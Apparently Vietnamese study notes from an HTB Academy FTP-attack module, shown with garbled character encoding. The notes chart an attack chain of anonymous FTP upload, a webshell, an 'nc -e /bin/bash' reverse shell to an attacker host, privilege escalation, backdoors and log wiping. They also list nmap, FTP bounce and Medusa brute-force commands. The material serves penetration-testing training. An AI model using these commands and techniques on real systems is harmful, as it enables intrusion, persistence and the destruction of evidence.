# Real-World Attack Chain  
## FTP ‚Üí Webshell ‚Üí Reverse Shell ‚Üí PrivEsc ‚Üí Persistence

T√†i li·ªáu n√†y m√¥ t·∫£ to√†n b·ªô chu·ªói t·∫•n c√¥ng d∆∞·ªõi d·∫°ng **Mermaid Sequence Diagram**, t·ª´ l√∫c attacker ph√°t hi·ªán FTP misconfig cho t·ªõi khi ƒë·∫°t ƒë∆∞·ª£c **root + persistence**.

---

## 1. Sequence Diagram ‚Äì To√†n b·ªô lu·ªìng t·∫•n c√¥ng

```mermaid
sequenceDiagram
    autonumber

    participant A as Attacker
    participant F as FTP Server
    participant W as Web Server
    participant L as Target OS
    participant P as Persistence

    Note over A: Stage 1 - FTP enumeration and initial access

    A->>F: Nmap scan port 21 (sC sV ftp-anon)
    F-->>A: Anonymous allowed and writable directory found

    A->>F: FTP login (anonymous or weak creds)
    F-->>A: Login successful

    A->>F: Upload webshell.php
    F-->>A: File stored successfully

    Note over F: FTP folder is mapped to webroot

    A->>W: HTTP GET /uploads/shell.php?cmd=id
    W->>L: Execute system('id')
    L-->>W: Output returned
    W-->>A: id output returned

    Note over W: Stage 2 - RCE and reverse shell

    A->>W: Trigger reverse shell payload
    W->>L: Run nc -e /bin/bash attacker:4444
    L-->>A: Reverse shell established

    A->>L: Stabilize shell with pty + stty

    Note over L: Stage 3 - Local enumeration

    A->>L: Run id, uname -a, sudo -l
    L-->>A: System info and sudo rights

    A->>L: Enumerate SUID, cron, configs
    L-->>A: SUID binaries, cron jobs, credentials

    Note over L: Stage 4 - Privilege escalation

    alt SUID based privesc
        A->>L: Exploit SUID binary
        L-->>A: Root shell
    else sudo misconfiguration
        A->>L: Run sudo exploit (GTFOBins)
        L-->>A: Root shell
    else cronjob abuse
        A->>L: Inject reverse shell into cron script
        L-->>A: Root shell from cron
    else password reuse
        A->>L: su or ssh using reused password
        L-->>A: Root shell
    end

    Note over P: Stage 5 - Persistence and cleanup

    A->>P: Add SSH key persistence
    P-->>A: SSH root access enabled

    A->>P: Install systemd service or cron backdoor
    P-->>A: Scheduled reverse shell active

    A->>L: Cleanup logs and history
    L-->>A: Logs cleaned

    Note over A: Final result - Root access and persistence established


```

---

## 2. T√≥m t·∫Øt chu·ªói t·∫•n c√¥ng

1. **FTP Enumeration**
2. **Initial Access (Anonymous/Weak Login)**    anonymous l√† t√†i kho·∫£n m·∫∑c ƒë·ªãnh n·∫øu ch∆∞a c·∫•u h√¨nh g√¨
3. **Upload Webshell ‚Üí RCE**
4. **Reverse Shell**
5. **Local Enumeration**
6. **Privilege Escalation**
7. **Persistence (SSH key, systemd, cron)**
8. **Anti-Forensics**

---




# üìò Attacking FTP ‚Äì Lu·ªìng Ki·∫øn Th·ª©c + C√¢u L·ªánh + Flowchart + Mindmap Elevation Level 3‚Äì4

T√†i li·ªáu t·ªïng h·ª£p ki·∫øn th·ª©c t·ª´ **Attacking FTP ‚Äì HTB Academy** d∆∞·ªõi d·∫°ng:
- **Lu·ªìng ki·∫øn th·ª©c (knowledge flow)**
- **Danh s√°ch ƒë·∫ßy ƒë·ªß c√¢u l·ªánh (commands)**
- **Flowchart Mermaid**
- **Mindmap Elevation Level 3 & 4**

---

# ## 1. FLOWCHART ‚Äì LU·ªíNG KI·∫æN TH·ª®C

```mermaid
flowchart TD

A[FTP Overview] --> B[Enumeration]
A --> C[Misconfigurations]
A --> D[Protocol Attacks]
A --> E[Finding Sensitive Info]

%% Enumeration
B --> B1[Nmap Enumeration]
B1 --> CMD1[Nmap Commands]
B --> B2[Manual FTP Interaction]
B2 --> CMD2[FTP Commands]
B --> B3[Banner Grabbing]
B3 --> CMD3[nc Commands]

%% Misconfigs
C --> C1[Anonymous Login]
C1 --> CMD4[anonymous login]
C --> C2[Writable Directories]
C2 --> CMD5[put / mput]

%% Protocol Attacks
D --> D1[Brute Forcing]
D1 --> CMD6[Medusa Brute Force]
D --> D2[Password Spraying]
D --> D3[FTP Bounce Attack]
D3 --> CMD7[Nmap -b]

%% Sensitive Info
E --> E1[Download Files]
E1 --> CMD8[get / mget]
E --> E2[Config & Credentials]
E --> E3[Use in Attack Chains]
```


---

# ## 2. DANH S√ÅCH C√ÇU L·ªÜNH ‚Äì FULL COMMAND SET

### üîπ **Nmap Enumeration**
```bash
sudo nmap -sC -sV -p 21 <IP>
```

### üîπ **FTP Bounce Attack**
FTP Bounce Attack l√† k·ªπ thu·∫≠t t·∫•n c√¥ng l·ª£i d·ª•ng l·ªánh PORT c·ªßa FTP ƒë·ªÉ:
üëâ Bu·ªôc FTP server g·ª≠i d·ªØ li·ªáu ƒë·∫øn m·ªôt m√°y kh√°c trong m·∫°ng n·ªôi b·ªô, ch·ª© kh√¥ng ph·∫£i g·ª≠i cho attacker.
V√¨ v·∫≠y attacker c√≥ th·ªÉ:
    D√πng FTP server nh∆∞ proxy
    G·ª≠i y√™u c·∫ßu t·ªõi m√°y n·ªôi b·ªô (Internal_DMZ) m√† b√¨nh th∆∞·ªùng attacker kh√¥ng truy c·∫≠p ƒë∆∞·ª£c
    Scan port ho·∫∑c thu th·∫≠p th√¥ng tin c·ªßa m√°y ƒë√≥
    
Attacker c√≥ th·ªÉ:
    Scan m·∫°ng n·ªôi b·ªô qua FTP server
    T·ª´ b√™n ngo√†i v·∫´n ‚Äúnh√¨n th·∫•y‚Äù port open b√™n trong
    S·ª≠ d·ª•ng th√¥ng tin ƒë√≥ ƒë·ªÉ m·ªü r·ªông t·∫•n c√¥ng v√†o n·ªôi b·ªô

```bash
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

### üîπ **FTP Client Commands**
```bash
ftp <IP>
ls
cd <folder>
get <file>
mget *
put <file>
mput <files>
help
```

### üîπ **Netcat Banner Grabbing**
```bash
nc <IP> 21
```

### üîπ **Medusa Brute Force**
```bash
medusa -u <user> -P /usr/share/wordlists/rockyou.txt \
-h <IP> -M ftp
```

---

# ## 3. MINDMAP ‚Äì ELEVATION LEVEL 3

```mermaid
mindmap
  root((Attacking FTP))

    FTP_Overview
      Port_21
      File_Operations
        Upload
        Download
        Directory_List
      Usage
        Software_Deploy
        Website_Maintenance

    Enumeration
      Nmap
        -sC_script
        -sV_version
        ftp-anon
      Manual
        ftp_client
        nc_banner
      File_Access
        ls
        cd
        get_mget

    Misconfigurations
      Anonymous_Login
        No_password
        Read_sensitive_files
      Writable_Directory
        incoming
        pub
        Upload_webshell
      Sensitive_Files
        backup
        credentials
        configs

    Protocol_Attacks
      Brute_Force
        medusa_usage
      Password_Spraying
      FTP_Bounce
        PORT_misuse
        nmap_-b
        internal_scanning

    Sensitive_Info
      Download
      Config_Extraction
      Credential_Reuse
```

---

# ## 4. MINDMAP ‚Äì ELEVATION LEVEL 4 (SI√äU CHI TI·∫æT)

```mermaid
mindmap
  root((Attacking FTP - L4))

    FTP_Overview
      Definition
        Classic_protocol
        Cleartext_communication
      Ports
        TCP_21_control
        TCP_20_data
      Operations
        Command_channel
        Data_channel
      Risks
        Sniffing
        Misconfigs

    Enumeration
      Automated
        Nmap
          -sC_default_scripts
          ftp-anon_detect
          ftp-syst
          Version_detection
      Manual
        ftp_client
          login_attempts
          directory_navigation
        nc
          banner_reading
      Indicators
        Anonymous_allowed
        Writable_folder
        Outdated_version

    Misconfigurations
      Anonymous_Access
        default_setup
        no_password
        exposure_risk
      Permissions
        read_write_misconfig
        world_writable_folders
      Folder_Mapping
        FTP_to_Webroot
        Upload_exec_risk
      File_Leakage
        backup_files
        plaintext_passwords
        source_code

    Protocol_Attacks
      Brute_Forcing
        medusa
          user_single
          user_list
          password_list
      Password_Spraying
        avoid_lockout
      FTP_Bounce
        PORT_command_abuse
        host_port_redirection
        internal_network_scan
        nmap_bounce_mode

    Sensitive_Info
      Credentials
        DB_passwords
        SSH_keys
        app_config
      Backups
        zip
        tar
        txt
      Recon_Expansion
        combine_with_web_exploits
        path_traversal
        RCE_via_upload

    Attack_Chains
      FTP_to_Webshell
      FTP_to_Internal_Scan
      FTP_to_PrivEsc
```

---

# ## 5. K·∫æT LU·∫¨N

File n√†y t·ªïng h·ª£p:

- Ki·∫øn th·ª©c FTP ‚Üí Misconfig ‚Üí Attack Surface  
- C√¢u l·ªánh th·ª±c chi·∫øn ƒë·∫ßy ƒë·ªß  
- Flowchart + Mindmap Elevation 3 & 4  
‚Üí S·∫µn d√πng cho **HTB**, **CTF**, **Red Team Playbook**, **Learning Notebook**.

---


